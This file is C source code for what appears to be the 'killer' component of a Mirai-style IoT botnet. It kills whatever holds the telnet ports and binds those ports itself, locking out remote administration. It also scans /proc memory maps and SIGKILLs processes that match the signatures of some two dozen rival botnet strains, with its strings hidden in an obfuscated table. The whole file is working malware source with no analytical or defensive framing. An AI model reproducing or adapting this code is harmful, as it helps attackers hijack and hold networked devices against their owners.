#define _GNU_SOURCE

#ifdef KILLER

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    if(killer_kill_by_port(htons(23)))
    {
        tmp_bind_addr.sin_port = htons(23);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
    if(killer_kill_by_port(htons(2323)))
    {
        tmp_bind_addr.sin_port = htons(2323);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
    killer_kill_by_port(htons(6667));
    killer_kill_by_port(htons(1337));
    sleep(10);


    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            #ifdef DEBUG
                printf("[killer] failed to open /proc!\n");
            #endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            #ifdef DEBUG
                printf("[killer] scanning %d\n", pid);
            #endif

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);

            if(maps_scan_match(maps_path))
            {
                kill(pid, 9);
            }

            util_zero(maps_path, sizeof(maps_path));

            usleep(90000);
        }

        closedir(dir);
    }

    #ifdef DEBUG
        printf("[killer] finished\n");
    #endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;



    table_unlock_val(TABLE_EXEC_MIRAI);
    table_unlock_val(TABLE_EXEC_MANA);
    table_unlock_val(TABLE_EXEC_SORA1);
    table_unlock_val(TABLE_EXEC_SORA2);
    table_unlock_val(TABLE_EXEC_SORA3);
    table_unlock_val(TABLE_EXEC_OWARI);
    table_unlock_val(TABLE_EXEC_JOSHO);
    table_unlock_val(TABLE_EXEC_APOLLO);
    table_unlock_val(TABLE_EXEC_HOHO);
    table_unlock_val(TABLE_EXEC_ARES);
    table_unlock_val(TABLE_EXEC_YAKUZA);
    table_unlock_val(TABLE_EXEC_APEX);
    table_unlock_val(TABLE_EXEC_OWARI2);
    table_unlock_val(TABLE_EXEC_HITOLEAKED);
    table_unlock_val(TABLE_EXEC_HORIZON);
    table_unlock_val(TABLE_EXEC_HOHO2);
    table_unlock_val(TABLE_EXEC_GEMINI);
    table_unlock_val(TABLE_EXEC_HYBRID);
    table_unlock_val(TABLE_EXEC_SATAN);
    table_unlock_val(TABLE_EXEC_ORPHIC);
    table_unlock_val(TABLE_EXEC_ZAPON);
    table_unlock_val(TABLE_EXEC_OBBO);
    table_unlock_val(TABLE_EXEC_MYTH);
    table_unlock_val(TABLE_EXEC_ASHER);
    table_unlock_val(TABLE_EXEC_KALON);
    table_unlock_val(TABLE_EXEC_YUKARI);
    table_unlock_val(TABLE_EXEC_GREEKS);
    table_unlock_val(TABLE_EXEC_RAZOR);


    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_MIRAI, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_MIRAI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_SORA1, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_SORA1, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_SORA2, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_SORA2, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_OWARI, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_OWARI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_OWARI2, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_OWARI2, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_JOSHO, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_JOSHO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_APOLLO, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_APOLLO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_HOHO, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_HOHO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_ARES, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_ARES, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_YAKUZA, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_YAKUZA, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_SORA3, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_SORA3, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_MANA, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_MANA, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_APEX, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_APEX, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_HITOLEAKED, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_HITOLEAKED, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_HORIZON, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_HORIZON, NULL))) || 
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_HOHO2, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_HOHO2, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_GEMINI, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_GEMINI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_HYBRID, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_HYBRID, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_SATAN, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_SATAN, NULL))) || 
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_ORPHIC, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_ORPHIC, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_ZAPON, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_ZAPON, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_OBBO, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_OBBO, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_MYTH, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_MYTH, NULL))) || 
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_ASHER, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_ASHER, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_KALON, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_KALON, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_YUKARI, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_YUKARI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_GREEKS, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_GREEKS, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_EXEC_RAZOR, NULL), util_strlen(table_retrieve_val(TABLE_EXEC_RAZOR, NULL))))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_EXEC_MIRAI);
    table_lock_val(TABLE_EXEC_MANA);
    table_lock_val(TABLE_EXEC_SORA1);
    table_lock_val(TABLE_EXEC_SORA2);
    table_lock_val(TABLE_EXEC_SORA3);
    table_lock_val(TABLE_EXEC_OWARI);
    table_lock_val(TABLE_EXEC_JOSHO);
    table_lock_val(TABLE_EXEC_APOLLO);
    table_lock_val(TABLE_EXEC_HOHO);
    table_lock_val(TABLE_EXEC_ARES);
    table_lock_val(TABLE_EXEC_YAKUZA);
    table_lock_val(TABLE_EXEC_APEX);
    table_lock_val(TABLE_EXEC_OWARI2);
    table_lock_val(TABLE_EXEC_HITOLEAKED);
    table_lock_val(TABLE_EXEC_HORIZON);
    table_lock_val(TABLE_EXEC_HOHO2);
    table_lock_val(TABLE_EXEC_GEMINI);
    table_lock_val(TABLE_EXEC_HYBRID);
    table_lock_val(TABLE_EXEC_SATAN);
    table_lock_val(TABLE_EXEC_ORPHIC);
    table_lock_val(TABLE_EXEC_ZAPON);
    table_lock_val(TABLE_EXEC_OBBO);
    table_lock_val(TABLE_EXEC_MYTH);
    table_lock_val(TABLE_EXEC_ASHER);

    close(fd);

    return found;
}
static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

#endif
